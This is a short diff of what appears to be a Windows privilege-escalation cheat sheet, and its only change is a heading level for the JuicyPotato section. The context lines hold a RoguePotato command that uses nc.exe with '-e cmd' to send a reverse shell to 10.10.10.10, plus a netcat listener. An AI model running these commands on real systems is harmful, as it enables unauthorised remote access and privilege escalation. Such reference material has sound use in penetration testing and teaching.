@@ -293,7 +293,7 @@ RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 99
 
 nc.exe -nlvp 3001
 ```
-### JuicyPotato
+##### JuicyPotato
 SeImpersonate or SeAssignPrimaryToken privileges Required
 Visit https://ohpe.it/juicy-potato/CLSID/ for a list of CLSIDs to try.
 ```
